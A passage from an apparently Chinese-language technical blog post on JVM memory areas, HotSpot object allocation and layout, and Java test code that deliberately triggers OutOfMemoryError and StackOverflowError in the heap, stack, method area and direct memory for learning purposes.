<h2 id="本地方法栈"><a href="#本地方法栈" class="headerlink" title="本地方法栈"></a>本地方法栈</h2><p>​        与虚拟机栈类似，只不过虚拟站是执行Java方法，虚拟机栈是执行Native本地方法。也会有上述两种异常情况。</p>
<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>​        堆是虚拟机管理内存中最大的一部分，<em>是所有线程所共享的</em> ，该区域的唯一目的就是存放对象实例。本里应该是所有对象都存放在这里的，不过随着Java语言的不断发展，也不是很绝对。</p>
<p>​        由于堆空间是垃圾回收器管理的内存区域，也叫做“GC堆”，从回收内存的角度来看，由于现代垃圾回收器大部分都是基于分代收集理论设计的，所以我们常说：新生代，老年代，永久代，Eden空间，From Survivor空间，To Survivor空间，但这个只是一部分垃圾回收器的共同特性和设计风格，并不是标准就是这么规定的，还有一些其他的垃圾回收策略。</p>
<p>​        从分配内存的角度来看。Java堆空间可以划分出多个线程私有的分配缓冲区，以提高对象分配时的效率。将堆空间进行细分，只是为了更好地内存回收和内存分配。</p>
<p>​        根据《Java虚拟机规范》，Java堆可以处于物理上不连续的内存空间，但是在逻辑上它应该被视为连续的。</p>
<p>​        Java堆可以被实现成固定大小的，可以设置为可扩展的。(通过参数-Xmx和-Xms设定)，如果没有可分配的内存了，也会爆出OOM异常。</p>
<h2 id="方法区"><a href="#方法区" class="headerlink" title="方法区"></a>方法区</h2><p>​        方法区也是各个线程共享的区域，主要存放虚拟机加载的类信息，常量，静态变量，即时编译器编译后的代码缓存。</p>
<p>​        这里必须提到“永久代”这个概念，在JDK8以前很多人吧方法区叫做永久代，这是因为在之前HotSpot团队将收集器的分代思想扩展到方法区，用永久代来实现方法区，这样垃圾回收器就可以像管理堆一样的管理栈，但其他的虚拟机实现中并没有永久代，例如JRockit，IBM j9，这个并不被规范设定，而属于各自的实现。现在来看用永久代来实现方法区，更容易导致内存溢出问题。永久代有一个默认上限值。所以到了JDK6时就已经有使用<strong>本地内存</strong>来实现方法区的计划，到了JDK7时，就将<code>字符串常量池，静态变量</code>等移植到堆中，到了JDK8就彻底放弃了永久代，使用本地内存来实现<strong>元空间（Meta-space）</strong>把JDK7中剩下的内容放入（主要是类型信息）。</p>
<p>​        方法区这部分管理是比较宽松的，不需要连续的内存和内存大小的动态性。甚至可以不实现垃圾回收，但是并不是进去了，就永远保留，主要的内存回收针对的是常量池的回收和对类型的卸载。</p>
<p>​        如果方法区无法分配到更多的内存空间，就会爆出OOM异常。</p>
<h3 id="运行时常量池"><a href="#运行时常量池" class="headerlink" title="运行时常量池"></a>运行时常量池</h3><p>​        属于方法区的一部分，Class文件中除了类的模板，字段，方法，接口等描述信息，还有一个就是常量池表,用于存放编译后的各种字面量和符号引用。这部分内容在类加载后放在方法区的运行时常量池。</p>
<p>​        运行时常量池的一个特点就是动态性，并不要求常量一定只有编译期才能产生，运行期间也可以将新的常量放入。用得较多的就是String::intern()方法。</p>
<p>​        这部分在方法区内所以也有OOM的风险。</p>
<h2 id="直接内存"><a href="#直接内存" class="headerlink" title="直接内存"></a>直接内存</h2><p>​        这部分并不属于运行时数据区域，但是又频繁使用，而且会导致OOM的风险。</p>
<p>​        在JDK1.4中新加入了NIO类，引入了基于管道和缓冲区的I/O方式，它可以还是用Native函数库直接分配堆外内存，然后通过一个存储在堆里的DirectByteBuffer对象作为这片内存的引用操作，这样能提高性能，不用在java堆和Native堆上来回复制数据。</p>
<p>​        显然直接内存不会受到堆内存大小的限制，但是肯定是受到本机总内存的限制，一般服务器管理员如果在配置虚拟机内存管理大小时忽略掉这部分大小，可能就导致总使用内存大于实际内存大小。从而导致动态扩展时导致OOM异常。</p>
<h1 id="HotSpot虚拟机对象探秘"><a href="#HotSpot虚拟机对象探秘" class="headerlink" title="HotSpot虚拟机对象探秘"></a>HotSpot虚拟机对象探秘</h1><blockquote>
<p>这一章节我们讨论HotSpot虚拟机上Java堆中对象的分配，布局和访问的全过程</p>
</blockquote>
<h2 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h2><p>​        当虚拟机遇到一个字节码new指令时，会去检查这个指令的参数是否能在常量池中定位到一个类的符号引用，并检查这个类有没有加载，解析，初始化。如果没有则必须先加载类。</p>
<p>​        在一切准备工作完成后，虚拟机需要给新生对象分配内存空间，而该对象需要多大的空间在类的加载后就可以确定了，而为对象分配内存空间也就是把一块儿确认大小的内存块儿从堆空间中划分出来。这里有两种分配方式：</p>
<ol>
<li>假如堆中内存是绝对规整的，所有被使用的内存块儿放在一边，另一边是空闲的内存，中间放一个指针作为分界点。这样当需要新的空间时，只需要让指针平移与对象大小相等的距离，这种分配方式叫做指针碰撞。</li>
</ol>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hef3ssezj314g0f0dhy.jpg" alt="image-20220613222609748"></p>
<ol start="2">
<li>如果堆中空间并不是规整的，被使用的区域和空闲区域交叉在一起，则不能只用指针碰撞，而只能维护一个列表，记录哪些内存块儿可用。在分配时在列表中找一个足够大的区域进行分配，并更新列表。</li>
</ol>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hef5d3lpj316m0k877d.jpg" alt="image-20220613223521549"></p>
<p>​        使用哪种分配方式是由堆是否规整决定的，而堆是否规整是由采用的垃圾回收器是否带有空加压缩整理的能力决定的。</p>
<blockquote>
<p>除了如何划分空间以外，还有一个问题，对象创建在虚拟机中是非常频繁的操作，在多线程下，仅修改指针指向位置有这<strong>线程安全问题</strong>，比方说正在给对象A分配空间，指针还没有移动，对象B又使用原来的指针修改了。</p>
</blockquote>
<p>​        这里有两种解决方案：</p>
<ol>
<li>对分配动作进行同步处理，而实际中的虚拟机采用CAS来保证原子性和安全性。</li>
<li>把内存分配动作按照线程划分在不同的地方，即每个线程提前在堆中间分配一块儿空间，称为本地线程分配缓冲(TLAB)，哪个线程要分配内存，就在哪个线程的本地缓冲区中分配，只有本地缓冲区用完了，需要分配新的空间时再进行同步操作。是否使用TLAB，可以通过-XX:+/-UseTLAB来设定。</li>
</ol>
<p>​        在内存分配完成后，虚拟机必须将分配到的内存空间都初始化为0值，保证了对象的实例字段在java代码中可以不赋初始值就能直接使用。</p>
<p>​        接下来，虚拟机还需要对对象进行必要的设置，例如：这个对象是哪个类的实例（你是谁家的？），如何找到类的元数据信息（你家在哪？），对象的Hash值是多少（你身份证号多少？），对象的GC分代年龄（你多大？成年没？）</p>
<p>​        上面工作做完后，从虚拟机的角度看，一个新的对象已经创建好了，但从Java程序来看，对象的创建才刚刚开始——构造函数。也就是Class文件的<init>()方法没有执行，所有的字段为默认的零值，一般来说new指令之后会接着执行<init>()方法，按照程序设定来完成。这样一个可用对象就完成了。</p>
<h2 id="对象的内存布局"><a href="#对象的内存布局" class="headerlink" title="对象的内存布局"></a>对象的内存布局</h2><p>​        在HotSpot虚拟机中，对象在堆的存储布局分为：<strong>对象头，实例数据，对齐填充</strong>。</p>
<ol>
<li>对象头有两类信息<ol>
<li>存储对象自身的运行时数据，例如：哈希值，GC年龄，锁状态等数据。在32和64位虚拟机中分别为32位个bit和64个bit，官方称为 <strong>Mark Word</strong> ，但对象运行时数据很多，超过了32,64位Bitmap所能记录的最大限度，但对象头内的数据是对象自身定义数据的额外成本，所以被设计成一种动态的数据结构。</li>
<li>另一部分为类型指针，也就是虚拟机根据该指针来确定该对象是哪个类的实例，此外如果是数组，还需要记录数组的长度。</li>
</ol>
</li>
<li>实例数据，这里就存放着对象自身定义和从父类继承下来的各种类型的字段。HotSpot虚拟机默认分配顺序为longs、doubles、ints、shorts、chars、bytes、booleans，可以发现相同宽度的字段放在一起，且父类定义的会放在子类之前。如果参数设置：+XX:CompactFields参数为true（默认为true），子类中比较小的变量也允许插入到父类变量的空隙中，节省空间。</li>
<li>对齐填充，仅仅起到占位的作用。由于HotSpot虚拟机的自动内存管理系统要求对象起始地址必须是8字节的整数倍，换句话说任何对象的大小都必须是8字节的整数倍。对象头部分已经被设计成了8字节的倍数。</li>
</ol>
<h2 id="对象的访问"><a href="#对象的访问" class="headerlink" title="对象的访问"></a>对象的访问</h2><p>​        Java程序会通过栈上的reference数据来操作堆上的具体对象，它只是一个指向对象的引用。所以对象的访问方式也是又具体的虚拟机实现的，主流的访问方式是使用句柄和直接指针两种。</p>
<ol>
<li>通过句柄<ol>
<li>好处：reference中存放的稳定句柄地址，对象被移动（垃圾回收）时只改变句柄中的实例数据指针。reference本身不变。</li>
</ol>
</li>
</ol>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hef4as1rj316k0rawhw.jpg" alt="image-20220614225930127"></p>
<ol start="2">
<li>通过直接指针（默认）<ol>
<li>优点：一次访问，速度块</li>
</ol>
</li>
</ol>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hef30umij31680r8whn.jpg" alt="image-20220614230136856"></p>
<h1 id="实战：OutOfMemoryError异常"><a href="#实战：OutOfMemoryError异常" class="headerlink" title="实战：OutOfMemoryError异常"></a>实战：OutOfMemoryError异常</h1><p>​        在Java虚拟机规范中，除了程序计数器以外，其他区域都有发生内存溢出的可能，这一节通过代码验证各个运行时区域存储的内容，并且将初步介绍若干最基本的HotSpot虚拟机参数。</p>
<p>​        另外希望读者在实际工作中遇到内存异常时，能根据提示信息知道是哪个区域发生了异常，并且知道什么样的代码可能导致溢出。提示如果使用的控制台控制程序，直接在java后写参数即可，我这里使用的idea。</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hef4z2owj31pj0u00y2.jpg" alt="image-20220615085843593"></p>
<h2 id="Java堆异常"><a href="#Java堆异常" class="headerlink" title="Java堆异常"></a>Java堆异常</h2><p>​        堆是存放对象实例的，所以当创建过多的对象并没有及时的GC掉就会挤满堆空间。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">HeapOOM</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
   <span class="token comment">/**
    * vm args: -Xms20m -Xmx20m -XX:+HeapDumpOnOutOfMemoryError
    * 限制java堆的大小为20MB，不可扩展
    * -XX:+HeapDumpOnOutOfMemoryError 可以让虚拟机出现内存溢出异常时
    * Dump出当时的内存堆转储快照以便进行事后分析
    * 
    * java.lang.OutOfMemoryError: Java heap space
    */</span>
   <span class="token annotation punctuation">@Test</span>
   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">heap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HeapOOM</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HeapOOM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​        当出现<code>java.lang.OutOfMemoryError: Java heap space</code> 表示堆空间发生问题，要解决这个问题，我们需要分析映射出的<code>Dumping heap to java_pid753.hprof ...</code>文件。通过内存映像分析工具对Dump出来的堆转储快照进行分析。这里我们使用JProfiler来控制</p>
<ol>
<li><p>第一步确认到底是<code>内存溢出</code>还是<code>内存泄露</code>。</p>
<ol>
<li>内存溢出是指我无法申请到更多的空间</li>
<li>内存泄露是指我申请了空间，却无法释放已经申请的空间。</li>
</ol>
<blockquote>
<p>内存泄露  会导致  内存溢出</p>
</blockquote>
</li>
<li><p>如果是内存泄露，可以根据工具查看泄漏对象到GC Roots的引用链，什么原因导致无法被垃圾回收掉。</p>
</li>
<li><p>如果不是内存泄露，说明内存中的对象确实需要一存活，则应该检查-Xms -Xmx设置大小，看是否还可以多设置一些内存，再从代码上看，是否某些对象生命周期过长，存储结构不合理等。</p>
</li>
</ol>
<h2 id="虚拟机栈和本地方法栈溢出"><a href="#虚拟机栈和本地方法栈溢出" class="headerlink" title="虚拟机栈和本地方法栈溢出"></a>虚拟机栈和本地方法栈溢出</h2><p>​        在虚拟机中并不区分虚拟机栈和本地方法栈，只能通过<code>-Xss</code>参数化来设定，其中只有两种异常：</p>
<ol>
<li>栈深度大于虚拟机允许的最大深度：爆出StackOverflowError异常。</li>
<li>如果栈内存允许动态扩充，当无法再申请时爆出OOM。</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
     * 虚拟机栈中出现的异常分为，超出栈限制的最大深度，抛出StackOverFlowError
     * 如果允许栈内存动态拓展，则会在无法申请到更多内存时，抛出OOM
     * HotSpot虚拟机选择的是不支持扩展，所以多数是抛出StackOverFlowError
     * 在单线程下，可能会因为递归不断地插入新的栈帧而将栈挤爆
     * 在多线程下，也可能单个线程的栈还没有溢出，申请线程太多也会造成内存溢出OOM
     * vm args：-Xss限制栈内容量
     */</span>
    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">stack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token function">stackLeak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stack length : "</span><span class="token operator">+</span>stackLength<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">throw</span> e<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​        出现栈溢出还是比较好确定位置的。栈溢出的话我们可以采取扩容和尾递归优化等方法记性扩容，如果是多线程导致的内存溢出，且不能减少内存数量的情况，只能通过减少最大堆和减少栈容量来换取更多的线程。</p>
<h2 id="方法区和运行时常量池溢出"><a href="#方法区和运行时常量池溢出" class="headerlink" title="方法区和运行时常量池溢出"></a>方法区和运行时常量池溢出</h2><pre><code>     这里使用String.intern()方法来测试，该方法会先判断字符串是否在字符串常量池内，如果已经存在，则直接返回地址，如果没有则创建一对象，并返回地址。而在JDK6以前，字符串常量池是在永久代的，所以可以通过`-XX:PermSize -XX:MaxPermSize`来限制永久代的大小，即可间接限制字符串常量池的大小。运行结果为：OOME:PermGen space
</code></pre>
<p>​        但在JDK7,8以后再使用该参数就没有用了，因为字符串常量池一定转移到堆中了，使用<code>-Xms</code>来控制堆的大小。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
     * 在方法区和运行时常量池溢出
     * 通过String.inter()方法，该方法会先从字符串常量区寻找该对象，如果有直接返回，如果没有则创建并返回
     * JDK6以前 设置vm args：-XX:PermSize=6m -XX:MaxPermSize=6m 控制方法区大小 会爆出：OOM：PermGen space，
     * 说明这个时候的字符串常量池是在方法区中
     * JDK7以后 设置上述参数已经没有用了，字符串常量池被放在堆空间中，只能通过设置-Xmx参数限制堆大小可反应出来
     * vm args: -Xmx6m  爆出错误：OutOfMemoryError:GC overhead limit exceeded，这个代表当前已经没有可用内存了，经过多次GC之后仍然没有有效释放内存
     * -Xmx6m -XX:-UseGCOverheadLimit   爆出错误：OutOfMemoryError: Java heap space  说明字符串常量池已经转移到了堆空间中
     */</span>
    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">permGenSpace</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">intern</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<blockquote>
<p>这里还有一个面试题</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
     * 这个是String.intern()经典的问题
     * 当JDK6中得到的结果是两个false
     *      因为JDK6中 intern()方法将首次遇到的字符串实例复制到永久代的字符串常量池中存储，返回的也是字符串常量池的引用
     *      而StringBuilder创建的对象是在堆上面的，所有两者的地址当然不同
     * 而在JDK7中
     *      inter()方法就不需要再拷贝到字符串实例到常量池中了，字符串常量池已经在堆中了，只需要在字符串常量中记录一下实例引用就可以了
     *      而关于java的intern()爆出false，是因为在类加载的时候就有一个静态变量加入到字符串常量池了，所以后面再创建的就 不是同一个对象了
     *      System  --->  initializeSystemClass()  --->   sun.misc.Version.init();  其中Version类在加载的时候创建了一个静态变量
     *      private static final String launcher_name = "java";
     */</span>
    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">stringInternTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> str1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token string">"计算机"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"软件"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str1 <span class="token operator">==</span> str1<span class="token punctuation">.</span><span class="token function">intern</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//这里是直接在堆中创建了一个StringBuilder对象</span>
        <span class="token class-name">StringBuilder</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token string">"ja"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"va"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//去字符串常量池找是否有java，有则返回地址，没有则创建后放回</span>
        <span class="token class-name">String</span> intern <span class="token operator">=</span> <span class="token string">"java"</span><span class="token punctuation">.</span><span class="token function">intern</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//这里是根据StringBuilder的值先去看字符串常量池是否有，有则返回，没有则创建</span>
        <span class="token class-name">String</span> str2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> builder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"builder:"</span><span class="token operator">+</span>builder<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"str:"</span><span class="token operator">+</span>str2<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"or_str:"</span><span class="token operator">+</span>intern<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>方法区也是放置类型信息的地方，如果动态生成大量的类，也会导致方法区溢出</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
     * 关于方法去的内存溢出，注意：JDK6及其以前，方法区也被承认永久代，因为hotspot团队将堆空间的分代思想来构造方法区
     * 这样，就不用在针对方法区构建代码了，但是后来从JDk7开始将一些内容从方法区中抽离，而JDK完全使用元空间来代替永久代
     * 而一般类加载信息就会放到这部分中，我们可以通过不断地加载新的类，造成OOM
     * 这一块儿我们使用动态代理不断地创建新的类，需要注意的是这里并非纯粹的实验，许多主流的框架例如Spring都会使用到动态代理
     * 来创建新的代理类，而增强类越多，方法区就要越大，这样需要注意可能导致方法区的OOM
     * JDK7使用  JDK8中该指令已经remove了
     * vm args: -XX:PermSize=10M -XX:MaxPermSize=10M
     * JKD8使用
     * -XX:MaxMetaspaceSize:设置元空间的最大值，默认是-1，即不限制
     * -XX:MetaspaceSize:指定元空间的初始空间大小，以字节为单位，当触及该值时，进行垃圾回收
     *      ，同时收集器对该值进行调整，如果释放大量空间则将该值降低，如果释放很少的话，则会在最大值下相应提升
     * -XX:MinMetaspaceFreeRatio:作用是在垃圾回收之后控制最小的元空间剩余容量的百分比，可减少因为元空间的不足导致的
     *      垃圾回收的频率
     * -XX:MaxMetaspaceFreeRatio:控制对最大的元空间剩余容量的百分比
     *
     * Exception in thread "main" java.lang.OutOfMemoryError: Metaspace
     */</span>
    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">methodArea</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Enhancer</span> enhancer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Enhancer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            enhancer<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span><span class="token class-name">OOMObject</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            enhancer<span class="token punctuation">.</span><span class="token function">setUseCache</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            enhancer<span class="token punctuation">.</span><span class="token function">setCallback</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MethodInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">intercept</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> objects<span class="token punctuation">,</span> <span class="token class-name">MethodProxy</span> methodProxy<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">return</span> methodProxy<span class="token punctuation">.</span><span class="token function">invokeSuper</span><span class="token punctuation">(</span>objects<span class="token punctuation">,</span>objects<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            enhancer<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">OOMObject</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="直接内存溢出"><a href="#直接内存溢出" class="headerlink" title="直接内存溢出"></a>直接内存溢出</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
     * 直接内存，不属于运行时数据区，但这部分内存被频繁使用，而在JKD 1.4后加入了NIO
     * 它可以使用Native函数库直接分配堆外内存然后通过一个缓存在堆中的DirectByteBuffer对象
     * 作为这块儿内存的引用来操作，能显著的提高性能，因为避免了在Java堆和Native堆中来回的复制数据
     *
     * 容量可通过：-XX:MaxDirectMemorySize参数来设定大小，如果不设定默认使用java堆的最大值（-Xmx指定）
     *
     * java.lang.OutOfMemoryError
     * 	at sun.misc.Unsafe.allocateMemory(Native Method)
     * 	at OOM_EXP.text.DirectMemory(text.java:148)
     *
     * 由直接内存导致的内存溢出，明显特征是在Heap Dump文件中不会看见什么明显的异常情况
     * 如果发现内存溢出后的Dump文件很小，而程序中又间接的使用了DirectMemory（典型的间接使用就是Nio）
     * 那可以着重的检查直接内存方面的原因了
     */</span>
    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">DirectMemory</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> unsafeField <span class="token operator">=</span> <span class="token class-name">Unsafe</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        unsafeField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Unsafe</span> unsafe <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Unsafe</span><span class="token punctuation">)</span> unsafeField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            unsafe<span class="token punctuation">.</span><span class="token function">allocateMemory</span><span class="token punctuation">(</span>_1MB<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> _1MB <span class="token operator">=</span> <span class="token number">1024</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>​        由直接内存导致的内存溢出的一个明显的特征就是dump文件不会有明显异常情况，dump文件很小，如果程序中又使用了NIO，则需要重点关注。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​        现在我们已经知道虚拟机大概的划分，和各个区域存储什么信息，什么样的代码操作会导致，虽然Java中有垃圾回收，但如果不注意就会导致问题。</p>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>内存溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>垃圾回收与内存分配</title>
